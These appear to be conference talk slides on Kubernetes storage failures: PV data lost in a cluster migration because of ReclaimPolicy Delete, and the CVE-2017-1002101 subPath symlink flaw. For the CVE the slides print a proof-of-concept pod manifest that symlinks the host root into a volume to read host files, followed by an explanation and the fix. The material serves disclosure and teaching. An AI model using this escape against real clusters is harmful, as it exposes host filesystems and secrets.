
name: inverse
class: center, middle, inverse
layout: true

---

layout: true
class: top, left
<!-- the default layout -->

---

class: center, middle

# Storage on Kubernetes
## Learning From Failures
Hemant Kumar, Jan Šafránek<br/>
Red Hat

---

# Data lost during migration: What?
1. User moves PV an PVC objects from "testing" to "production" clusters.
    ```
    kubectl get pv -o yaml > pvs.yaml
    kubectl get pvc -o yaml > pvcs.yaml
    
    # + some manual editing / pruning
    
    kubectl apply -f pvs.yaml
    kubectl apply -f pvcs.yaml
    ```

2. **Kubernetes deletes PV and the volume in storage backend.**

---

# Data lost during migration: Why?

* PV has `ReclaimPolicy: Delete`.
  * *"Delete the volume when this PV is not needed any longer."*
  * *"Any longer"* = PVC does not exist.
* PVs were restored first!
  -> `ReclaimPolicy` was executed.

---

# Data lost during migration: How?
## It's not a bug, it's a feature!

* Do regular backups!
* Use dedicated tools for migration, such as Ark / Velero.
  * *How to Backup and Restore Your Kubernetes Cluster - Annette Clewett & Dylan Murray, Tuesday 4:25pm.*
* Consider using `ReclaimPolicy: Retain`.
  * Perhaps with a custom controller / operator that deletes the volumes after review, backup and / or grace period.

---

# CVE-2017-1002101: What?

*"Subpath volume mount handling allows arbitrary file access in host filesystem"*

```
apiVersion: v1
kind: Pod
metadata:
  name: my-pod
spec:
  initContainers:
  - name: init
    image: busybox
    command: ["/bin/sh", "-c", "ln -s / /mnt/vol/evil_link"]
    volumeMounts:
    - name: share
      mountPath: /mnt/vol
  containers:
  - name: cntr
    image: busybox
    command: ["/bin/sh", "-c", "ls -la /mnt/vol/run/docker"]
    volumeMounts:
    - name: share
      mountPath: /mnt/vol
      subPath: evil_link
  volumes:
  - name: share
    emptyDir:
```
TODO: test

---

# CVE-2017-1002101: Why?

1. Kubernetes tells container runtime to *"make `/var/lib/kubelet/pods/XYZ/volumes/emptydir/evil_link` available as `/mnt/vol` inside the container"*.
2. Container runtime creates bind-mount.
3. Kernel resolves the symlink `"evil_link"` -> `"/"`.
  * In the **host** mount namespace!
  * Bind-mounting the host's "`/`" into the container!

---

# CVE-2017-1002101: How?

* Resolve symlinks in a *safe* way.
* https://github.com/kubernetes/kubernetes/issues/60813
* KubeCon NA 2018: [*How Symlinks Pwned Kubernetes (And How We Fixed It) - Michelle Au, Google & Jan Šafránek, Red Hat*](https://events19.linuxfoundation.org/events/kubecon-cloudnativecon-north-america-2018/schedule/).

